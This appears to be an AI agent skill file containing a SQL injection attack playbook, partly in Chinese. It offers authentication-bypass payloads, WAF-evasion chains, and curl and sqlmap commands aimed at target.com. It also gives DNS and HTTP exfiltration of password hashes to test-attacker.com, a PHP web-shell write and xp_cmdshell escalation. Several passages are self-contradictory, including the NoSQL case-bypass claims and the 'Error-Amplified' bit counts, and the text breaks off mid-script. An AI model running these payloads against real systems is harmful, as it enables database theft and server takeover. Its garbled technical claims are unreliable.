---
name: sqli-sql-injection
description: >-
  SQL injection playbook. Use when input reaches SQL queries, authentication logic, sorting, filtering, reporting, or DB-specific blind and out-of-band execution paths.
---

# SKILL: SQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Advanced SQLi techniques. Assumes basic UNION/error/boolean-blind fundamentals known. Focuses on: per-database exploitation, out-of-band exfiltration, second-order injection, parameterized query bypass scenarios, filter evasion, and escalation to OS. For real-world CVE cases, SMB/DNS OOB exfiltration, INSERT/UPDATE injection patterns, and framework-specific exploitation (ThinkPHP, Django GIS), load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the backend is **Java with Jackson** and your SQL keywords are WAF-blocked — Jackson's `charToHex` table is indexed by `ch & 0xFF`, so a Unicode character like `丰` (U+4E30) resolves to hex digit `0` inside a `\uXXXX` escape sequence, letting you smuggle `UNION`, `SELECT`, `1`, etc. without the WAF ever seeing them

## 1. QUICK START

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- SMB out-of-band exfiltration via `LOAD_FILE` + UNC paths (Windows MySQL)
- KEY injection / URI injection / non-parameter injection points
- INSERT/DELETE/UPDATE statement injection differences
- ThinkPHP5 array key injection (`updatexml` error-based)
- Django GIS Oracle `utl_inaddr.get_host_name` CVE
- ORDER BY / LIMIT injection techniques

### Advanced Reference

Also load [SQLMAP_ADVANCED.md](./SQLMAP_ADVANCED.md) when you need:
- SQLMap tamper scripts matrix and WAF bypass tamper chain recipes (space2comment, between, charencode, etc.)
- `--technique`, `--risk`/`--level` combinations and `--second-url` for second-order injection
- `--os-shell` / `--os-pwn` OS-level exploitation via SQLMap
- INSERT/UPDATE/DELETE injection patterns with data exfiltration examples
- GraphQL + SQL injection (batched queries, nested field injection, mutation injection)
- DB-specific advanced functions: PostgreSQL dollar-sign quoting, MSSQL linked servers, Oracle DBMS_PIPE/DBMS_SCHEDULER

If you have only confirmed a suspicious SQL sink, do not load extra payload skills first; complete first-pass validation here.

### First-pass payload families

| Situation | Start With | Why |
|---|---|---|
| Login or boolean branch | `' or 1=1--` | Fast signal on auth or conditional checks |
| Numeric parameter | `1 or 1=1` | Avoid quote dependency |
| ORDER BY / sorting | `1,2,3` then `1 desc--` | Good for structural probing |
| Visible SQL errors | `'` then DBMS-specific error probes | Error text gives DBMS clues |
| No visible output | time-based payloads | Stable fallback for blind targets |
| Heavy filtering / WAF | polyglot or whitespace-free variants | Expands parser confusion surface |

### Small, stable first-pass set

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### DBMS routing hints

| Clue | Likely DBMS | Good Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | try `SLEEP()` and `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | try `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | try `pg_sleep()` |
| `ORA-` prefix | Oracle | pivot to out-of-band or XML features |
| SQLite errors, local apps | SQLite | focus on boolean/UNION and file-backed behavior |

---

## 1. DETECTION — SUBTLE INDICATORS

Most SQLi is found by **behavioral differences**, not errors:

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| Numeric: `1` vs `1-1` vs `2-1` returns same | Arithmetic evaluated |
| `1=1` vs `1=2` in condition changes result | Boolean-based injection |
| SELECT with ORDER BY N: column count enumeration | UNION prep |
| Time delay: `'; WAITFOR DELAY '0:0:5'--` | Blind/time-based |
| 500 error on `'`, 200 on `''` | Unhandled exception = SQLi |
| Different HTTP response size | Boolean blind indicator |

**Critical**: test in ALL parameter types — URL query, POST body, JSON fields, XML values, HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie values).

---

## 2. DATABASE FINGERPRINTING

```sql
-- MySQL
VERSION()              -- returns version string
@@datadir              -- data directory
@@global.secure_file_priv  -- file read restriction

-- MSSQL
@@VERSION              -- includes "Microsoft SQL Server"
DB_NAME()              -- current database
USER_NAME()            -- current user

-- Oracle
v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name      -- current db (alternative)
user                   -- current Oracle user

-- PostgreSQL
version()              -- returns version
current_database()     -- current db
current_user           -- current user
```

**Error-based fingerprint**: inject `'` and read error message format. MySQL errors differ from Oracle/MSSQL.

---

## 3. UNION-BASED DATA EXTRACTION

**Column count determination**:
```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY N--   ← until error = N-1 columns
```

**Column type detection** (NULL is safest):
```sql
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--  ← find string column
```

**Database-specific string concat** (required when column accepts only int):
```sql
-- MySQL
CONCAT(username,0x3a,password)

-- MSSQL
username+'|'+password

-- Oracle
username||'|'||password

-- PostgreSQL
username||':'||password
```

---

## 4. BLIND INJECTION — INFERENCE TECHNIQUES

### Boolean Blind (conditional response difference)
```sql
-- Does first char of username = 'a'?
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--

-- Oracle
' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--
```

### Time-Based Blind (no response difference)
```sql
-- MSSQL (most reliable)
'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--

-- MySQL
' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
-- Oracle sleep alternative (no SLEEP):
' AND 1=UTL_HTTP.REQUEST('http://test-attacker.com/'||(SELECT user FROM dual))--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 5. OUT-OF-BAND (OOB) EXFILTRATION — CRITICAL

Use when blind injection has no time/boolean indicator, or when batch queries can't return data inline.

### MSSQL — OpenRowSet (requires SQLOLEDB, outbound TCP)
```sql
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=test-attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) VALUES (@@version)--

-- Exfiltrate table data:
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=test-attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) SELECT TOP 1 username+':'+password FROM users--
```
Use **port 80 or 443** to bypass firewall egress restrictions.

### Oracle — UTL_HTTP (HTTP GET with data in URL path)
```sql
'+UTL_HTTP.REQUEST('http://test-attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```
Oracle's UTL_HTTP supports proxy — can exfil through corporate proxy!

### Oracle — UTL_INADDR (DNS exfiltration — often bypasses HTTP restrictions)
```sql
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.test-attacker.com')--
```
Attacker sees: `HASH_VALUE.test-attacker.com` DNS query → read password hash.

### Oracle — UTL_SMTP / UTL_TCP
```sql
-- Email large data dumps:
UTL_SMTP.SENDMAIL(...)  -- send query results via email

-- Raw TCP socket:
UTL_TCP.OPEN_CONNECTION('test-attacker.com', 80)
```

### MySQL — DNS via LOAD_FILE (Windows + UNC path)
```sql
SELECT LOAD_FILE('\\\\test-attacker.com\\share')
-- Triggers DNS lookup before connection attempt
-- Works on Windows hosts with outbound SMB
```

### MySQL — INTO OUTFILE (in-band filesystem write)
```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
-- Requirements: FILE privilege, writable web root, secure_file_priv=''
```

---

## 6. ESCALATION — OS COMMAND EXECUTION

### MSSQL — xp_cmdshell (if enabled, or if sysadmin)
```sql
'; EXEC xp_cmdshell('whoami')--

-- Enable if disabled (requires sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

### MySQL — UDF (User Defined Functions)
Write malicious shared library to filesystem, then `CREATE FUNCTION ... SONAME`.

### Oracle — Java Stored Procedures
```sql
-- Create Java class:
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
-- Then exec OS commands via Java Runtime
```

---

## 7. SECOND-ORDER INJECTION

**Concept**: User input is stored safely (parameterized), but later **retrieved as trusted data** and concatenated into a new query without re-sanitization.

**Example attack flow**:
1. Register username: `admin'--`
2. Application safely inserts this into users table
3. Password change function fetches username from session (trusted!) and builds:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Comment strips the condition → updates **admin's** password

**Key insight**: Any application function that reads stored data and uses it in a new DB query is a second-order candidate. Review: password change, profile update, admin action on user data.

---

## 8. PARAMETERIZED QUERY BYPASS SCENARIOS

Parameterized queries do NOT prevent SQLi when:

1. **Table/column names are user-controlled** — params can't parameterize identifiers:
   ```sql
   -- UNSAFE even with params:
   "SELECT * FROM " + tableName + " WHERE id = ?"
   ```
   Mitigation: whitelist-validate table/column names.

2. **Partial parameterization** — some fields concatenated, others parameterized:
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"
   -- userType not parameterized → injection
   ```

3. **IN clause** with dynamic count (common mistake in ORMs):
   ```sql
   SELECT * FROM items WHERE id IN (1, 2, ?)  -- only last is parameterized
   ```

4. **Second-order** — data retrieved from DB assumed clean, re-used in query without params.

---

## 9. FILTER EVASION TECHNIQUES

### Comment Injection (break keywords)
```sql
SEL/**/ECT
UN/**/ION
1 UN/**/ION ALL SEL/**/ECT NULL--
```

### Case Variation
```sql
UnIoN SeLeCt
```

### URL Encoding
```sql
%55NION  -- U
%53ELECT -- S
```

### Whitespace Alternatives
```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- tab
SELECT%0ausername%0aFROM%0ausers  -- newline
```

### String Construction (bypass literal-string detection)
```sql
-- MySQL concatenation without quotes:
CHAR(117,115,101,114,110,97,109,101)  -- 'username'

-- Oracle:
CHR(117)||CHR(115)||CHR(101)||CHR(114)

-- MSSQL:
CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)
```

---

## 10. DATABASE METADATA EXTRACTION

### MySQL
```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### MSSQL
```sql
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'  -- user tables
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
```

### Oracle
```sql
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username,password FROM dba_users  -- requires DBA
```

### PostgreSQL
```sql
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## 11. STORED PROCEDURE ABUSE

### MSSQL — sp_OAMethod (COM automation)
```sql
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'
```

### Oracle — DBMS_LDAP (outbound LDAP = DNS exfil)
```sql
SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.test-attacker.com',389) FROM dual
```

---

## 12. QUICK REFERENCE — INJECTION TEST STRINGS

```
'                          -- break string context
''                         -- escaped quote (test handling)
' OR 1=1--                 -- auth bypass attempt  
' OR 'a'='a               -- alternate auth bypass
'; SELECT 1--             -- statement termination
' UNION SELECT NULL--     -- UNION test
' AND 1=1--               -- boolean true
' AND 1=2--               -- boolean false (different response → injectable)
1; WAITFOR DELAY '0:0:3'-- -- MSSQL time delay
1 AND SLEEP(3)--          -- MySQL time delay
1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle time delay
```

---

## 13. WAF BYPASS MATRIX

| Technique | Blocked | Bypass |
|---|---|---|
| Space filtered | `SELECT * FROM` | `SELECT/**/*//**/FROM`, `SELECT%0a*%0aFROM` |
| Comma filtered | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| Quote filtered | `'admin'` | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| OR/AND filtered | `OR 1=1` | <code>&#124;&#124;1=1</code>, `&&1=1`, `DIV 0` |
| = filtered | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| SELECT filtered | | Use `handler` (MySQL), `PREPARE`+hex, or stacked queries |
| information_schema filtered | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |

Additional WAF bypass patterns:

- Polyglot: `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`
- Routed injection: `1' UNION SELECT 0x(inner_payload_hex)-- -` where inner payload is another full query hex-encoded
- Second Order: inject into storage, trigger when data is used in another query later
- PDO emulated prepare: when `PDO::ATTR_EMULATE_PREPARES=true`, stacked queries work even with parameterized-looking code

---

## 14. WAF BYPASS MATRIX

### No-Space Bypass
```sql
SELECT/**/username/**/FROM/**/users
SELECT(username)FROM(users)
```

### No-Comma Bypass
```sql
-- UNION with JOIN instead of comma:
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- SUBSTRING alternative: SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT alternative: LIMIT 1 OFFSET 0
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- First query returns string used as input to second query:
' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--
-- The returned value becomes part of another SQL context
```

### Second-Order Injection
```
-- Step 1: Register username: admin'--
-- Step 2: Trigger password change (uses stored username in SQL)
-- UPDATE users SET password='new' WHERE username='admin'--'
```

### PDO / Prepared Statement Edge Cases
```php
// Unsafe even with PDO when query structure is dynamic:
$pdo->query("SELECT * FROM " . $_GET['table']);
// Or when using emulated prepares with multi-query:
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
```

### Entry Point Detection (Unicode tricks)
```
U+02BA ʺ (modifier letter double prime) → "
U+02B9 ʹ (modifier letter prime) → '
%%2727 → %27 → '
```

---

## 15. 2026 EMERGING TECHNIQUES

### JSON-Structured SQLi (2025-2026 trend)

Many WAFs cannot correctly parse a JSON request body, so embedding the payload inside a JSON value bypasses signature detection:

```json
{"username":"admin' OR '1'='1","password":"x"}
```

The WAF sees a benign JSON field; the backend extracts `admin' OR '1'='1` and concatenates it into SQL.

### ORM Filter Injection (2026)

Raw-query interfaces leak SQLi when fed un-parameterized input:

| Framework | API | Injection Vector |
|---|---|---|
| SQLAlchemy | `text()` | Concatenated SQL string |
| Django ORM | `.extra()` / raw `where` | Un-parameterized `where` clause |
| Prisma | `$queryRaw` / `$executeRaw` | Template-literal interpolation |
| Ransack (Rails) | `q[param_cont]` | `LIKE '%input%'` operator injection |

Django ORM filter injection — boolean filter keys reach `WHERE`:

```text
GET /users?q[password__startswith]=a
-> WHERE password LIKE 'a%'
```

Iterate `a..z` to extract the password one character at a time. Prisma nested `include`/`select` can leak password fields when the client over-fetches relations.

### GraphQL-to-SQL Injection

If the GraphQL layer does not whitelist nested-field depth/parameters, an attacker builds a deeply nested query that passes user input through resolvers into the underlying SQL, reaching sinks the GraphQL schema never intended to expose.

### AI-Assisted Injection (2026 new trend)

A local LLM (GPT4All / Ollama) automatically rewrites SQLi payloads to bypass WAF keyword blacklists by semantic-preserving syntactic transforms:

```text
Original:  ' OR '1'='1
Rewritten: ' || '1' like '1
           ' OR 1#                       (comment variant)
           ' OR true                     (boolean variant)
```

The payload is semantically equivalent but the byte signature differs, defeating keyword-based blacklists.

### HTTP/3 (QUIC) WAF Bypass

HTTP/3 runs over QUIC/UDP. Many WAFs only inspect TCP/HTTP1-2 traffic. Attackers use HTTP/3 multiplexing and different header-frame formats so the WAF cannot correctly reassemble/inspect the request body, smuggling SQLi payloads past inspection.

### WAF Bypass Encoding (2026, still effective)

```text
Double encoding:    %2527%2520UNION%2520SELECT
Hex encoding:       0x61646d696e   (replaces 'admin')
Unicode encoding:   \u0027
Inline comment:     UN/**/ION SEL/**/ECT
Case mixing:        UnIoN SeLeCt
Equivalent function:LIKE instead of =, REGEXP instead of =
```

### BWAFSQLi — 对抗样本驱动的自动化 WAF 绕过 (2026 学术突破)

BWAFSQLi（ACM 2026）是首个系统化的**对抗样本 WAF 绕过框架**，针对 ModSecurity CRS 等主流规则集实现高成功率语义等价变异 [$TRAE_REF](https://dl.acm.org/doi/pdf/10.1145/3788286)。

**核心机制**：
- **26 条规则 + 15 种变异策略**：对检测到的 payload token 应用 15 种保持语义等价的变异
- **两种全新变异技术**：
  - `Quotation Mark Encoding`（引号编码）：`'admin'` → `CHAR(97,100,109,105,110)` 等价表达
  - `Comment Extension`（注释扩展）：`OR 1=1` → `OR/**_**/1=/**_**/1` 利用注释填充打乱正则
- **自适应变异选择机制**：集成衰减因子(decay factor) + 历史数据表，实现多位置自适应变异，减少请求次数
- **评估方式**：变异 payload 通过 HTTP 请求实测目标 WAF，成功则记录

**15 种变异策略速查表**：

| # | 策略 | 示例 |
|---|------|------|
| 1 | 大小写混淆 | `UnIoN SeLeCt` |
| 2 | 注释插入 | `UN/**/ION` |
| 3 | 引号编码 | `'a'`→`CHAR(97)` |
| 4 | 注释扩展 | `OR/**_**/1=1` |
| 5 | 空白符替换 | `%09 %0a %0b %0c %0d` |
| 6 | 关键字拆分 | `UN` `ION` 拆分 |
| 7 | 编码叠加 | 双重 URL/Unicode 编码 |
| 8 | 等价函数 | `SUBSTR`→`MID`→`SUBSTRING` |
| 9 | 等价运算符 | `=`→`LIKE`→`IN`→`BETWEEN` |
| 10 | 布尔等价 | `1=1`→`1<2`→`2>1` |
| 11 | 字符串拼接 | `'ad'+'min'` |
| 12 | 十六进制 | `'admin'`→`0x61646d696e` |
| 13 | 嵌套括号 | `((1))=(1)` |
| 14 | JSON/XML 封装 | 结构化包裹 |
| 15 | 协议级变异 | HTTP/2 头部/分块编码 |

**实战变异链示例**：

```sql
-- 原始 payload (被 WAF 拦截):
' UNION SELECT username,password FROM users--

-- BWAFSQLi 变异链 (逐步应用策略):
-- Step 1 (策略1+2): 大小写+注释
' UnIoN SeL/**/ECT username,password FROM users--

-- Step 2 (策略3+4): 引号编码+注释扩展
' UnIoN SeL/**/ECT CHAR(117,115,101,114,110,97,109,101),/**_**/password FROM users--

-- Step 3 (策略5+8): 空白符+等价函数
'%09UnIoN%09SeL/**/ECT%09CHAR(117,115,101,114,110,97,109,101),/**_**/MID(password,1,99)%09FROM%09users--

-- Step 4 (策略9+10): 等价运算符+布尔等价
'%09UnIoN%09SeL/**/ECT%09CHAR(117,115,101,114,110,97,109,101),/**_**/MID(password,1,99)%09FROM%09users%09WHERE%091/**_**/LIKE%091--
```

**自适应变异选择机制**：
```python
# BWAFSQLi 伪代码: 自适应选择最优变异策略
class BWAFSQLiMutator:
    def __init__(self):
        self.history = {}  # 记录每条规则的历史成功率
        self.decay = 0.95  # 衰减因子
    
    def select_mutation(self, token, position):
        # 计算每种变异策略的加权分数
        scores = {}
        for strategy in self.strategies:
            # 历史成功率 * 衰减因子^(时间距离)
            base_score = self.history.get((token, strategy), 0.5)
            decayed = base_score * (self.decay ** self.age(token, strategy))
            # 位置权重: 不同位置对不同策略敏感度不同
            position_weight = self.position_sensitivity(position, strategy)
            scores[strategy] = decayed * position_weight
        
        # 选择得分最高的策略
        return max(scores, key=scores.get)
    
    def update(self, token, strategy, success):
        # 更新历史数据
        self.history[(token, strategy)] = success
```

### Error-Amplified Blind SQLi (2026 新技术)

传统 Blind SQLi 每次请求只能提取 1 bit 信息(True/False)，2026 年提出的 **Error-Amplified Blind** 技术通过**故意触发可控错误**，将单次请求的信息量提升到 **8+ bits**。

**原理**：利用数据库错误消息中的**可控信息泄露**，在 Blind 场景下通过错误码/错误文本差异传递多 bit 信息。

```sql
-- 传统 Boolean Blind: 1 bit/请求
' AND SUBSTRING(password,1,1)='a'--  → True/False (1 bit)

-- Error-Amplified Blind: 8 bits/请求
' AND (SELECT CASE WHEN (ASCII(SUBSTRING(password,1,1)) BETWEEN 97 AND 122)
  THEN 1/0 ELSE 1 END)-- 
-- → 如果条件为真: 触发 "division by zero" 错误 (特定错误码)
-- → 如果条件为假: 正常执行 (无错误)
-- → 但只区分 True/False = 仍 1 bit

-- Error-Amplified 进阶: 利用不同错误类型传递多 bit
' AND (SELECT CASE 
  WHEN (ASCII(SUBSTRING(password,1,1)) BETWEEN 97 AND 103) THEN CAST('x' AS INT)
  WHEN (ASCII(SUBSTRING(password,1,1)) BETWEEN 104 AND 110) THEN 1/0
  WHEN (ASCII(SUBSTRING(password,1,1)) BETWEEN 111 AND 122) THEN UPDATETEXT()
  ELSE 1 END)--
-- → 3 种不同错误 + 无错误 = 4 种状态 = 2 bits/请求
-- → 配合多条件 CASE: 可达 8+ bits/请求
```

**多数据库错误类型映射**：

| 数据库 | 可控错误类型 | 区分方式 | bits/请求 |
|--------|-------------|---------|----------|
| MySQL | `1365`(除零), `1064`(语法), `1366`(类型转换) | 错误码 | 2-3 |
| MSSQL | `8134`(除零), `245`(转换), `515`(NULL) | 错误码 | 2-3 |
| PostgreSQL | `22012`(除零), `22P02`(类型), `42883`(函数) | SQLSTATE | 2-3 |
| Oracle | `ORA-01476`(除零), `ORA-01722`(转换), `ORA-06502` | 错误码 | 2-3 |

**效率对比**：
```
传统 Boolean Blind: 提取 8 字符密码 = 64 次请求 (1 bit/次)
Error-Amplified:    提取 8 字符密码 = 16 次请求 (4 bits/次)
加速比: 4x
```

### NoSQL 注入 — JSON 大小写绕过 (2026 新向量)

MongoDB 等 NoSQL 数据库的查询操作符(`$gt`, `$ne`, `$regex`)是大小写敏感的，但部分应用框架在解析 JSON 时会**规范化键名大小写**，导致安全过滤可被绕过。

```json
// 应用安全过滤检查: 拦截 "$gt", "$ne", "$regex" 等
// 但框架解析时将键名转为小写 → "$GT" 被过滤漏过

// 原始攻击 (被拦截):
{"username": {"$gt": ""}, "password": {"$regex": "^admin"}}

// 大小写绕过 (绕过过滤):
{"username": {"$GT": ""}, "password": {"$REGEX": "^admin"}}
{"username": {"$Gt": ""}, "password": {"$ReGeX": "^admin"}}
{"username": {"$gT": ""}, "password": {"$rEgEx": "^admin"}}

// 框架行为:
// Express.js (body-parser): 保留原始大小写 → MongoDB 接受 $gt
// Django (json module): 保留原始大小写 → 但 ORM 可能规范化
// Spring Boot (Jackson): 默认保留 → 但自定义反序列化可能转小写
```

**Node.js + Express 实战**：
```javascript
// 应用代码 (存在漏洞):
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    // 安全过滤: 检查是否包含 NoSQL 操作符
    if (JSON.stringify(req.body).match(/\$(gt|ne|regex|where|in)/i)) {
        return res.status(403).send('Blocked');
    }
    // 但正则 /i 标志只匹配小写形式
    // 如果攻击者使用 $GT → 不匹配 → 绕过!
    User.findOne({ username, password }).then(user => {
        // $GT 被 MongoDB 解释为 $gt (大小写不敏感的操作符)
        if (user) res.send('Login success');
    });
});

// 绕过 payload:
// {"username": {"$GT": ""}, "password": {"$GT": ""}}
// → $GT 不匹配过滤正则(/\$gt/i 只匹配 $gt, $GT, $Gt 等)
// → 但如果正则用了 /i 标志，需要用其他绕过方式

// 更高级绕过: Unicode 编码
// {"username": {"\u0024gt": ""}}
// → \u0024 = $ → 解析后为 $gt → 绕过字符串匹配过滤
```

**检测命令**：
```bash
# 1. 测试 NoSQL 注入端点
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# 2. 大小写绕过测试
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$NE": ""}, "password": {"$NE": ""}}'

# 3. Unicode 编码绕过测试
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"\u0024ne": ""}, "password": {"\u0024ne": ""}}'

# 4. $where JavaScript 注入
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"$where": "function(){return this.username == \"admin\"}"}'
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 5 条完整、可即用的实战攻击链，覆盖 2026 年真实场景。所有命令均以授权渗透测试为前提。

### 攻击链 1：认证绕过 + WAF 规避（Ghost Bits / Unicode 技巧）

**场景**：目标使用 Jackson（Java）解析 JSON 请求体 + MySQL 后端 + Cloudflare WAF 拦截 `UNION`/`SELECT`/`OR 1=1` 等关键词。

**原理**：Jackson 的 `charToHex` 表按 `ch & 0xFF` 索引，Unicode 字符 `丰`（U+4E30）会解析为十六进制 `0`，从而在 `\uXXXX` 转义序列中"走私"SQL 关键词，WAF 基于字节签名永远看不到这些关键词。详见 [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md)。

**步骤 1：基础探测确认注入点**

```bash
# 基础认证绕过探测（无 WAF 规避）
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1-- -","password":"x"}'

# 若被 WAF 拦截（403），改用 Ghost Bits Unicode 走私
# 将 "OR 1=1" 中的部分字符替换为 Unicode 等价物
# \u0027 = 单引号, \u004f = O, \u0052 = R
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d\u0020\u002d","password":"x"}'
```

**步骤 2：Unicode 全角字符绕过（WAF 字节签名失效）**

```bash
# 使用全角字符 ＝(U+FF1D) 替代 =，＇(U+FF07) 替代单引号
# MySQL 在某些字符集下会将全角字符规范化为半角
curl -i -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin＇ OR 1＝1-- -","password":"x"}'

# 组合：双重 URL 编码 + 注释扩展
# 原始: ' UNION SELECT 1,2,3--
# 双重编码: %2527 %2555NION %2553ELECT
curl -i "http://target.com/product?id=1%2527%2520%2555NION%2520%2553ELECT%25201,2,3--%2520-"
```

**步骤 3：Ghost Bits 完整走私链（Java/Jackson 目标）**

```python
# ghost_bits_sqli.py - 生成 Jackson Unicode 走私 payload
# 利用 Jackson charToHex 按 & 0xFF 索引的特性
# 字符 '丰'(U+4E30) → 0x30 = '0', '亡'(U+4EA1) → 0x21 = '!'
# 构造 \uXXXX 序列中 smuggle SQL 关键词

import json

def ghost_bits_smuggle(sql_payload):
    """
    将 SQL payload 中的 ASCII 字符编码为 \uXXXX 序列
    其中高位字节选择特殊 Unicode 字符使其 & 0xFF 后等于目标 hex 数字
    """
    # Jackson charToHex 映射: 0-9, a-f 对应的 Unicode 字符
    # 这里用标准 \u00XX 表示（最简单形式，WAF 通常不拦截 \u 转义）
    result = ""
    for ch in sql_payload:
        if ch in "' OR UNION SELECT " or ch.isalnum():
            # 编码为 \u00XX
            result += f"\\u{ord(ch):04x}"
        else:
            result += ch
    return result

# 原始 SQL: ' OR '1'='1'--
payload = "' OR '1'='1'-- -"
smuggled = ghost_bits_smuggle(payload)
print(f"Smuggled payload: {smuggled}")

# 实际发送: Jackson 在 JSON 字符串中解析 \uXXXX 转义
# WAF 看到的是 \u0027\u0020... 而非 ' OR ...
# Jackson 反序列化后字符串变为原始 ' OR '1'='1'--
cmd = f'''curl -i -X POST http://target.com/api/login \\
  -H "Content-Type: application/json" \\
  -d '{{"username":"{smuggled}","password":"x"}}'
'''
print(f"执行命令:\n{cmd}")
```

**步骤 4：sqlmap 自动化 + 自定义 tamper 绕过**

```bash
# 使用 sqlmap 配合多 tamper 链绕过 WAF
# --tamper 链: charencode(字符编码) + between(BETWEEN替换) + space2comment(空格转注释)
sqlmap -u "http://target.com/product?id=1" \
  --tamper=charencode,between,space2comment \
  --dbms=mysql \
  --level=5 --risk=3 \
  --random-agent \
  --delay=2 \
  --technique=BEUSTQ \
  --batch

# 针对 Jackson 目标的 Unicode tamper
sqlmap -u "http://target.com/api/login" \
  --data='{"username":"*","password":"x"}' \
  --tamper=charunicodeencode \
  --dbms=mysql \
  --level=5 --risk=3
```

**检测规避要点**：
- `\uXXXX` 转义在 JSON 层面对 WAF 是"无害"字符串
- 全角字符在不同字符集下行为不同，需测试 `utf8mb4` vs `latin1`
- 双重 URL 编码绕过仅解码一次的 WAF
- 注释扩展 `/**_**/` 打乱正则匹配

---

### 攻击链 2：Blind SQLi + DNS 外带（OOB）via sqlmap --dns-domain

**场景**：完全盲注场景（无布尔差异、无时间差异、无错误回显），但目标服务器可发起 DNS 出站请求。MySQL `secure_file_priv` 限制 INTO OUTFILE，Windows 目标可走 UNC 路径 DNS 解析。

**原理**：利用 `LOAD_FILE('\\\\attacker.com\\share')` 触发 DNS 解析（Windows）或 MSSQL `xp_dirtree` / PostgreSQL `COPY TO PROGRAM` 触发 DNS 查询，将数据编码到子域名中外带。

**步骤 1：确认 OOB DNS 通道可用**

```bash
# 启动 DNS 接收服务（攻击者侧）
# 使用 Interactsh 或自建 DNS 服务器
interactsh-client  # 获取 *.oast.fun 临时域名

# 或自建 DNS 服务器（Python）
cat > /data/user/work/dns_server.py << 'EOF'
# 简易 DNS 日志服务器，记录所有查询
import socketserver, struct

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request[0].strip()
        # 解析 DNS 查询域名
